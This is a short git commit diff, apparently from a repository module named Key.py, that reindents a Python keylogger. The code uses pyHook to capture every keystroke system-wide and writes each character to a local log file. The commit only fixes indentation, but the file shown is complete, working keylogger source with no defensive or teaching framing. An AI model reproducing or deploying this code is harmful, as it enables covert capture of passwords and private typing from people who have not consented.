6dd929ed900d1cbe537d6e7ff6f41bbda970403e
ItachiUchiha4 <gajanaruto@gmail.com>
2016-12-21 21:10:40 +0530

    Update Key.py

--- modules/Key.py
+++ modules/Key.py
@@ -1,10 +1,10 @@
 import pyHook, pythoncom, sys, logging
 file_log = 'C:keyloggeroutput.txt'
 def OnKeyboardEvent(event):
-logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-chr(event.Ascii)
-logging.log(10,chr(event.Ascii))
-return True
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
 hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
